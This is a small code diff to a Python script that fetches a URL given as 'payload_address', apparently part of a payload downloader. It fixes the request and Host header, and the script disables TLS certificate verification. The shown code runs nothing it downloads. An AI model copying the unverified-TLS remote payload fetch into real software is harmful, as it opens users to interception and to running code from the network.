@@ -11,6 +11,7 @@ from urllib.request import Request, urlopen
 from ssl import create_default_context, CERT_NONE
 
 payload_address = argv[1]
+hostname = payload_address.split('/')[2]
 
 class Init: 
     def __init__(self):
@@ -19,8 +20,8 @@ class Init:
         self.context = create_default_context()
         self.context.check_hostname = False
         self.context.verify_mode = CERT_NONE
-        self.content = Request()
- self.content.add_header('Host', f'{payload_address}') 
+        self.content = Request(payload_address)
+ self.content.add_header('Host', f'{hostname}') 
         self.content.add_header('Accept-Encoding', 'gzip, deflate, br')
         self.content.add_header('Accept-Language', 'en-US;q=0.5,en;q=0.3')
         
